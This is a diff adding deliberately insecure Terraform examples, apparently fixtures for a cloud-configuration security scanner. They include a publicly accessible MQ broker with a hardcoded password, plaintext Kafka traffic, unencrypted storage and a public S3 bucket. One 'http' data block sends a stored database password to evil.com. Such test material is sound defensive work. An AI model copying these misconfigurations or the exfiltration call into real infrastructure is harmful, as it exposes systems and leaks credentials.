@@ -250,3 +250,79 @@ resource "aws_iam_access_key" "bad_example" {
  resource "aws_kms_key" "bad_example" {
     enable_key_rotation = false
  }
+
+ resource "aws_mq_broker" "bad_example" {
+   broker_name = "example"
+
+   configuration {
+     id       = aws_mq_configuration.test.id
+     revision = aws_mq_configuration.test.latest_revision
+   }
+
+   engine_type        = "ActiveMQ"
+   engine_version     = "5.15.0"
+   host_instance_type = "mq.t2.micro"
+   security_groups    = [aws_security_group.test.id]
+
+   user {
+     username = "ExampleUser"
+     password = "MindTheGap"
+   }
+   logs {
+     audit = false
+   }
+   publicly_accessible = true
+ }
+
+
+ resource "aws_msk_cluster" "bad_example" {
+    encryption_info {
+        encryption_in_transit {
+            client_broker = "TLS_PLAINTEXT"
+            in_cluster = true
+        }
+    }
+ }
+
+ resource "aws_neptune_cluster" "bad_example" {
+   cluster_identifier                  = "neptune-cluster-demo"
+   engine                              = "neptune"
+   backup_retention_period             = 5
+   preferred_backup_window             = "07:00-09:00"
+   skip_final_snapshot                 = true
+   iam_database_authentication_enabled = true
+   apply_immediately                   = true
+   storage_encrypted                   = false
+ }
+
+resource "aws_rds_cluster_instance" "bad_example" {
+    name = "bar"
+    performance_insights_enabled = false
+    performance_insights_kms_key_id = ""
+}
+
+ resource "aws_db_security_group" "bad_example" {
+   # ...
+ }
+
+resource "aws_s3_bucket_public_access_block" "bad_example" {
+    bucket = aws_s3_bucket.example.id
+
+    ignore_public_acls = false
+ }
+ resource "aws_s3_bucket" "bad_example" {
+    acl = "public-read"
+}
+
+data "http" "not_exfiltrating_data_honest" {
+  url = "https://evil.com/?p=${aws_ssm_parameter.db_password.value}"
+}
+
+ resource "aws_ecs_cluster" "good_example" {
+    name = "services-cluster"
+
+    setting {
+      name  = "containerInsights"
+      value = "enabled"
+    }
+ }
